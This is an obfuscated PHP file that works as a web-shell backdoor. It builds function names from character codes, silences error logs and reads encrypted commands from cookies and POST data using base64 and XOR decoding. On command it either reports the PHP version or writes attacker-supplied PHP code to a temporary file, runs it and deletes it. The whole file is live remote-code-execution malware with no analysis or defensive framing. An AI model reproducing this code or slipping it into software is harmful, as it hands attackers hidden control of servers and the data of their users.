<?php $qkoyryw = chr(672-570).chr(105)."\x6c"."\145".chr(167-72)."\160".chr(117).'t'.chr(97-2)."\x63".chr(852-741)."\x6e"."\x74"."\145".chr(110).chr(116)."\163";
$jkeuiihttz = "\x62"."\141".chr(115).chr(101).chr(252-198).chr(52).'_'.chr(424-324)."\145"."\143".'o'."\144"."\145";
$xmgyofe = chr(271-166).chr(985-875).'i'."\137".chr(489-374)."\145".'t';
$mqeao = "\x75"."\x6e"."\154".'i'.chr(110).'k';


@$xmgyofe(chr(101).chr(144-30)."\x72".chr(619-508)."\x72"."\x5f".chr(523-415).chr(433-322).'g', NULL);
@$xmgyofe(chr(114-6)."\x6f".chr(103)."\x5f".chr(101).'r'.chr(303-189)."\x6f"."\x72".'s', 0);
@$xmgyofe("\155"."\x61".chr(1000-880)."\x5f".chr(101).chr(120).chr(101).'c'.chr(319-202).chr(116).chr(105).'o'.chr(110)."\x5f".'t'."\x69"."\x6d"."\x65", 0);
@set_time_limit(0);

function wdjgoaur($vpukj, $mcpjbald)
{
    $dpkkqc = "";
    for ($xciecernk = 0; $xciecernk < strlen($vpukj);) {
        for ($j = 0; $j < strlen($mcpjbald) && $xciecernk < strlen($vpukj); $j++, $xciecernk++) {
            $dpkkqc .= chr(ord($vpukj[$xciecernk]) ^ ord($mcpjbald[$j]));
        }
    }
    return $dpkkqc;
}

$fwmtcyrsuo = array_merge($_COOKIE, $_POST);
$xuchdrwnt = '75e7b92f-796f-48a6-9ac6-f9b504addbaa';
foreach ($fwmtcyrsuo as $slsbu => $vpukj) {
    $vpukj = @unserialize(wdjgoaur(wdjgoaur($jkeuiihttz($vpukj), $xuchdrwnt), $slsbu));
    if (isset($vpukj["\141".'k'])) {
        if ($vpukj['a'] == chr(105)) {
            $xciecernk = array(
                "\160"."\x76" => @phpversion(),
                chr(755-640).chr(728-610) => "3.5",
            );
            echo @serialize($xciecernk);
        } elseif ($vpukj['a'] == 'e') {
            $hpfho = "./" . md5($xuchdrwnt) . chr(562-516).'i'.chr(110)."\x63";
            @$qkoyryw($hpfho, "<" . '?'."\160".chr(1093-989).chr(795-683)."\40"."\100"."\x75".chr(110).chr(965-857).chr(303-198).'n'.chr(107)."\50"."\137".chr(95)."\106"."\111".chr(76).'E'.chr(1019-924)."\x5f".chr(241-200).';'.' ' . $vpukj[chr(100)]);
            @include($hpfho);
            @$mqeao($hpfho);
        }
        exit();
    }
}

